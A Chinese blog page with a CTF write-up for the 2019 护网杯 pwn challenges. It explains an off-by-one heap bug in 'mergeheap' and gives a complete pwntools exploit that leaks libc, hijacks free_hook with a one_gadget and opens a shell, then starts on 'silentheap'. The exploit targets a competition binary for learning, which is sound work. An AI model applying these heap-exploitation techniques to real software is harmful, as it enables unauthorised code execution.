@@ -1,0 +1,1153 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next muse use-motion" lang="zh-Hans">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+
+<script src="//cdn.bootcss.com/pace/1.0.2/pace.min.js"></script>
+<link href="//cdn.bootcss.com/pace/1.0.2/themes/pink/pace-theme-flash.css" rel="stylesheet">
+
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css" />
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="pwn,ctf,writesups," />
+
+
+
+
+
+
+
+
+
+
+<meta name="description" content="题目地址：https://github.com/hacker-mao/ctf_repo/tree/master/%E6%8A%A4%E7%BD%91%E6%9D%AF2019/pwn 一共4道题，比赛时间太短，赛后花了一天时间弄出3道，继续学习 mergeheap libc2.27，典型的tcache题目，程序的漏洞在于off by one     当分配的堆块占用了下一chunk的pre_siz">
+<meta name="keywords" content="pwn,ctf,writesups">
+<meta property="og:type" content="article">
+<meta property="og:title" content="2019护网杯_pwn">
+<meta property="og:url" content="http://yoursite.com/2019/09/08/2019护网杯-pwn/index.html">
+<meta property="og:site_name" content="1mpossible">
+<meta property="og:description" content="题目地址：https://github.com/hacker-mao/ctf_repo/tree/master/%E6%8A%A4%E7%BD%91%E6%9D%AF2019/pwn 一共4道题，比赛时间太短，赛后花了一天时间弄出3道，继续学习 mergeheap libc2.27，典型的tcache题目，程序的漏洞在于off by one     当分配的堆块占用了下一chunk的pre_siz">
+<meta property="og:locale" content="zh-Hans">
+<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/5808046-5e9b3102a80d7c83.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/5808046-5eaa9afd4c734e52.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/5808046-5f1d0c22a65db907.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/5808046-96c29fa89b6bbc80.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/5808046-8036e7fe809e5b9d.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/5808046-e25a3ce7a01694ea.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/5808046-4766edeac8577b8b.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/5808046-10e8d661fe8ad3f7.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/5808046-d3d325711faed238.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/5808046-a6ded759f2472a18.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/5808046-5d8ef622f7c5171e.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/5808046-501af17bd5208614.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/5808046-6a0399ddae38dbf3.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/5808046-9ab15600b36a108a.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/5808046-8d6c6e8331ebe7dd.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/5808046-1455b28f6b2ad5b7.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/5808046-ae41f6bcaf1d181c.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/5808046-feca49d03f4f8157.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/5808046-0a1ad8a1b2c01096.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/5808046-3603b77f430c3cb4.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/5808046-99e50c8703c9f55d.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/5808046-6a5eadf655477cf4.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/5808046-5d4d807712db2e66.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/5808046-592aed777dd59aa0.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/5808046-9cba7fb1ef1646d0.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/5808046-1cd201345a87177c.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/5808046-9d24f96668948c8b.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+<meta property="og:updated_time" content="2019-09-07T19:56:28.136Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="2019护网杯_pwn">
+<meta name="twitter:description" content="题目地址：https://github.com/hacker-mao/ctf_repo/tree/master/%E6%8A%A4%E7%BD%91%E6%9D%AF2019/pwn 一共4道题，比赛时间太短，赛后花了一天时间弄出3道，继续学习 mergeheap libc2.27，典型的tcache题目，程序的漏洞在于off by one     当分配的堆块占用了下一chunk的pre_siz">
+<meta name="twitter:image" content="https://upload-images.jianshu.io/upload_images/5808046-5e9b3102a80d7c83.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Muse',
+    version: '5.1.4',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: '博主'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="http://yoursite.com/2019/09/08/2019护网杯-pwn/"/>
+
+
+
+
+
+  <title>2019护网杯_pwn | 1mpossible</title>
+  
+
+
+
+
+
+  <script type="text/javascript">
+    var _hmt = _hmt || [];
+    (function() {
+      var hm = document.createElement("script");
+      hm.src = "https://hm.baidu.com/hm.js?4e8a62468b73a2eaab4764496c434a66";
+      var s = document.getElementsByTagName("script")[0];
+      s.parentNode.insertBefore(hm, s);
+    })();
+  </script>
+
+
+
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+<a href="https://github.com/hacker-mao" class="github-corner" aria-label="View source on Github"><svg width="80" height="80" viewBox="0 0 250 250" style="fill:#151513; color:#fff; position: absolute; top: 0; border: 0; right: 0;" aria-hidden="true"><path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path><path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2" fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"></path><path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z" fill="currentColor" class="octo-body"></path></svg></a><style>.github-corner:hover .octo-arm{animation:octocat-wave 560ms ease-in-out}@keyframes octocat-wave{0%,100%{transform:rotate(0)}20%,60%{transform:rotate(-25deg)}40%,80%{transform:rotate(10deg)}}@media (max-width:500px){.github-corner:hover .octo-arm{animation:none}.github-corner .octo-arm{animation:octocat-wave 560ms ease-in-out}}</style>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/"  class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">1mpossible</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle"></p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
+            
+            首页
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br />
+            
+            标签
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-th"></i> <br />
+            
+            分类
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
+            
+            归档
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/09/08/2019护网杯-pwn/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="D4rk3r">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/head.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="1mpossible">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">2019护网杯_pwn</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-09-08T03:55:47+08:00">
+                2019-09-08
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/pwn/" itemprop="url" rel="index">
+                    <span itemprop="name">pwn</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+              <span class="post-comments-count">
+                <span class="post-meta-divider">|</span>
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-comment-o"></i>
+                </span>
+                <a href="/2019/09/08/2019护网杯-pwn/#comments" itemprop="discussionUrl">
+                  <span class="post-comments-count valine-comment-count" data-xid="/2019/09/08/2019护网杯-pwn/" itemprop="commentCount"></span>
+                </a>
+              </span>
+            
+          
+
+          
+          
+             <span id="/2019/09/08/2019护网杯-pwn/" class="leancloud_visitors" data-flag-title="2019护网杯_pwn">
+               <span class="post-meta-divider">|</span>
+               <span class="post-meta-item-icon">
+                 <i class="fa fa-eye"></i>
+               </span>
+               
+                 <span class="post-meta-item-text">热度&#58;</span>
+               
+                 <span class="leancloud-visitors-count"></span>
+                 <span>℃</span>
+             </span>
+          
+
+          
+
+          
+            <div class="post-wordcount">
+              
+                
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-file-word-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">字数统计&#58;</span>
+                
+                <span title="字数统计">
+                  2.5k
+                </span>
+              
+
+              
+                <span class="post-meta-divider">|</span>
+              
+
+              
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-clock-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">阅读时长 &asymp;</span>
+                
+                <span title="阅读时长">
+                  12
+                </span>
+              
+            </div>
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <p>题目地址：<a href="https://github.com/hacker-mao/ctf_repo/tree/master/%E6%8A%A4%E7%BD%91%E6%9D%AF2019/pwn" target="_blank" rel="noopener">https://github.com/hacker-mao/ctf_repo/tree/master/%E6%8A%A4%E7%BD%91%E6%9D%AF2019/pwn</a></p>
+<p>一共4道题，比赛时间太短，赛后花了一天时间弄出3道，继续学习</p>
+<h1 id="mergeheap"><a href="#mergeheap" class="headerlink" title="mergeheap"></a>mergeheap</h1><ul>
+<li>libc2.27，典型的tcache题目，程序的漏洞在于off by one </li>
+</ul>
+<p><img src="https://upload-images.jianshu.io/upload_images/5808046-5e9b3102a80d7c83.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt=""></p>
+<ul>
+<li><p>当分配的堆块占用了下一chunk的pre_size位时，strcpy的时候会将下一chunk的size也复制，再配合strcat会溢出一个字节</p>
+</li>
+<li><p>首先先填满tcache，为了下一次free时候将会放入unsorted bin中，然后构造4个不和填充tcache的chunk大小一样的chunk，注意chunk1和chunk2的大小要等于chunk0，为了等下构造堆溢出</p>
+</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">#填满tcache</span><br><span class="line">for i in range(7):</span><br><span class="line">	add(0x80,str(i))</span><br><span class="line"></span><br><span class="line">for i in range(7):</span><br><span class="line">	dele(i)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">add(0x78,&apos;a&apos;) #0</span><br><span class="line">add(0x38,&apos;b&apos;*0x38) #1</span><br><span class="line">add(0x40,&apos;d&apos;*0x3f+&apos;\x91&apos;) #2</span><br><span class="line">add(0x60,&apos;c&apos;) #3</span><br></pre></td></tr></table></figure>
+<p><img src="https://upload-images.jianshu.io/upload_images/5808046-5eaa9afd4c734e52.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt=""></p>
+<ul>
+<li>接着释放chunk0，合并chunk1和chunk2到chunk0的位置，并且会触发off by one修改chunk1的size为0x91</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">dele(0)</span><br><span class="line">merge(1,2) #0</span><br></pre></td></tr></table></figure>
+<p><img src="https://upload-images.jianshu.io/upload_images/5808046-5f1d0c22a65db907.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt=""></p>
+<ul>
+<li>然后把chunk1 free掉会得到一块0x90的bins，但由于0x90的tcache事先被填充满了，所以会放入unsorted bin中，然后我们再分配一块0x30大小的chunk，libc会从刚刚的unsorted bin中切割一部分，这时候剩下的unsorted bin刚好落入chunk2上，打印chunk2就可以泄漏libc，进而得到free_hook地址和one_gadget地址</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">dele(1)</span><br><span class="line">add(0x30,&apos;d&apos;) #1</span><br><span class="line">show(2)</span><br><span class="line">leak_libc = u64(p.recv(6).ljust(8,&apos;\x00&apos;))</span><br><span class="line">info(&apos;leak_libc : 0x%x&apos;,leak_libc)</span><br><span class="line">libc_base = leak_libc - 96 - 0x3ebc40</span><br><span class="line">info(&apos;libc_base : 0x%x&apos;,libc_base)</span><br><span class="line">free_hook = libc_base + 0x3ed8e8 </span><br><span class="line">one_gadget = libc_base + 0x4f322</span><br></pre></td></tr></table></figure>
+<p><img src="https://upload-images.jianshu.io/upload_images/5808046-96c29fa89b6bbc80.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt=""></p>
+<ul>
+<li>紧接着重复类似上面的操作</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">#清空unsorted bin</span><br><span class="line">add(0x40,&apos;1&apos;)</span><br><span class="line"></span><br><span class="line">add(0x68,&apos;aa&apos;)  #5</span><br><span class="line">add(0x28,&apos;b&apos;*0x38)  #6</span><br><span class="line">add(0x40,&apos;d&apos;*0x3f+&apos;\x81&apos;)  #7</span><br><span class="line">add(0x60,&apos;c&apos;) #8</span><br></pre></td></tr></table></figure>
+<p><img src="https://upload-images.jianshu.io/upload_images/5808046-8036e7fe809e5b9d.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt=""></p>
+<ul>
+<li>依然利用off by one修改chunk_size</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">dele(5)</span><br><span class="line">merge(6,7) #5</span><br></pre></td></tr></table></figure>
+<p><img src="https://upload-images.jianshu.io/upload_images/5808046-e25a3ce7a01694ea.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt=""></p>
+<ul>
+<li>free 掉chunk6，再free掉chunk7，再malloc一个0x70的chunk就会分配到chunk6的位置，这时候就可以对chunk7进行uaf利用，修改fd指针指向free_hook，然后改为one_gadget</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">#hijack free_hook -&gt; one_gadget</span><br><span class="line">dele(6)</span><br><span class="line">dele(7)</span><br><span class="line"></span><br><span class="line">add(0x70,&apos;a&apos;*0x20+p64(0)+p64(0x51)+p64(free_hook))</span><br><span class="line">add(0x40,&apos;b&apos;)</span><br><span class="line">add(0x40,p64(one_gadget))</span><br><span class="line">dele(0)</span><br></pre></td></tr></table></figure>
+<p><img src="https://upload-images.jianshu.io/upload_images/5808046-4766edeac8577b8b.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt=""></p>
+<p>完整exp:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br></pre></td><td class="code"><pre><span class="line">#coding:utf-8</span><br><span class="line">from pwn import *</span><br><span class="line">context.log_level = &apos;debug&apos;</span><br><span class="line"></span><br><span class="line">p = process(&apos;./mergeheap&apos;)</span><br><span class="line">#p = remote(&apos;49.232.101.96&apos;,51582)</span><br><span class="line"></span><br><span class="line">def sl(x):</span><br><span class="line">	p.sendline(x)</span><br><span class="line"></span><br><span class="line">def ru(x):</span><br><span class="line">	p.recvuntil(x)</span><br><span class="line"></span><br><span class="line">def se(x):</span><br><span class="line">	p.send(x)</span><br><span class="line"></span><br><span class="line">def add(size,content):</span><br><span class="line">	ru(&apos;&gt;&gt;&apos;)</span><br><span class="line">	sl(&apos;1&apos;)</span><br><span class="line">	ru(&apos;len:&apos;)</span><br><span class="line">	sl(str(size))</span><br><span class="line">	ru(&apos;content:&apos;)</span><br><span class="line">	sl(content)</span><br><span class="line"></span><br><span class="line">def show(idx):</span><br><span class="line">	ru(&apos;&gt;&gt;&apos;)</span><br><span class="line">	sl(&apos;2&apos;)</span><br><span class="line">	ru(&apos;idx:&apos;)</span><br><span class="line">	sl(str(idx))</span><br><span class="line"></span><br><span class="line">def dele(idx):</span><br><span class="line">	ru(&apos;&gt;&gt;&apos;)</span><br><span class="line">	sl(&apos;3&apos;)</span><br><span class="line">	ru(&apos;idx:&apos;)</span><br><span class="line">	sl(str(idx))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def merge(idx_1,idx_2):</span><br><span class="line">	ru(&apos;&gt;&gt;&apos;)</span><br><span class="line">	sl(&apos;4&apos;)</span><br><span class="line">	ru(&apos;idx1:&apos;)</span><br><span class="line">	sl(str(idx_1))</span><br><span class="line">	ru(&apos;idx2:&apos;)</span><br><span class="line">	sl(str(idx_2))</span><br><span class="line"></span><br><span class="line">#填满tcache</span><br><span class="line">for i in range(7):</span><br><span class="line">	add(0x80,str(i))</span><br><span class="line"></span><br><span class="line">for i in range(7):</span><br><span class="line">	dele(i)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">add(0x78,&apos;a&apos;) #0</span><br><span class="line">add(0x38,&apos;b&apos;*0x38) #1</span><br><span class="line">add(0x40,&apos;d&apos;*0x3f+&apos;\x91&apos;) #2</span><br><span class="line">add(0x60,&apos;c&apos;) #3</span><br><span class="line"></span><br><span class="line">#----------------------------------</span><br><span class="line"></span><br><span class="line">dele(0)</span><br><span class="line">merge(1,2) #0</span><br><span class="line"></span><br><span class="line">#----------------------------------</span><br><span class="line"></span><br><span class="line">dele(1)</span><br><span class="line">add(0x30,&apos;d&apos;) #1</span><br><span class="line">show(2)</span><br><span class="line">leak_libc = u64(p.recv(6).ljust(8,&apos;\x00&apos;))</span><br><span class="line">info(&apos;leak_libc : 0x%x&apos;,leak_libc)</span><br><span class="line">libc_base = leak_libc - 96 - 0x3ebc40</span><br><span class="line">info(&apos;libc_base : 0x%x&apos;,libc_base)</span><br><span class="line">free_hook = libc_base + 0x3ed8e8 </span><br><span class="line">one_gadget = libc_base + 0x4f322</span><br><span class="line"></span><br><span class="line">#----------------------------------</span><br><span class="line"></span><br><span class="line">#清空unsorted bin</span><br><span class="line">add(0x40,&apos;1&apos;)</span><br><span class="line"></span><br><span class="line">add(0x68,&apos;aa&apos;)  #5</span><br><span class="line">add(0x28,&apos;b&apos;*0x38)  #6</span><br><span class="line">add(0x40,&apos;d&apos;*0x3f+&apos;\x81&apos;)  #7</span><br><span class="line">add(0x60,&apos;c&apos;) #8</span><br><span class="line"></span><br><span class="line">#----------------------------------</span><br><span class="line"></span><br><span class="line">dele(5)</span><br><span class="line">merge(6,7) #5</span><br><span class="line"></span><br><span class="line">#----------------------------------</span><br><span class="line">#hijack free_hook -&gt; one_gadget</span><br><span class="line">dele(6)</span><br><span class="line">dele(7)</span><br><span class="line"></span><br><span class="line">add(0x70,&apos;a&apos;*0x20+p64(0)+p64(0x51)+p64(free_hook))</span><br><span class="line">add(0x40,&apos;b&apos;)</span><br><span class="line">add(0x40,p64(one_gadget))</span><br><span class="line">#trigger one_gadget</span><br><span class="line">dele(0)</span><br><span class="line"></span><br><span class="line">#----------------------------------</span><br><span class="line">#gdb.attach(p)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+<p><img src="https://upload-images.jianshu.io/upload_images/5808046-10e8d661fe8ad3f7.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt=""></p>
+<h1 id="silentheap"><a href="#silentheap" class="headerlink" title="silentheap"></a>silentheap</h1><ul>
+<li>这题主要考验细心程度吧，漏洞点在dele里。第二次循环没有到9，因此假如输入idx为9，就会直接把ptr[9] free掉，然后把flag[9]置0</li>
+</ul>
+<p><img src="https://upload-images.jianshu.io/upload_images/5808046-d3d325711faed238.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt=""></p>
+<ul>
+<li>如果我们将ptr[9]分配一个0x360的堆块，原先的flag值是2，经过dele(9)后，它的值会变成0，这时候执行case3的函数时，将会调用<em>(ptr[index]+0x55</em>4)这个地址的函数，而我们可以通过修改<strong><em>aThouWhoArtDark</em></strong>来构造一个地址，相当于任意地址执行，但我们不知道one_gadget地址，由于题目是32位的，发现one_gadget地址每次只会变动2个字节，于是可以爆破2字节去执行one_gadget地址，概率是1/256，试了下还挺快的</li>
+</ul>
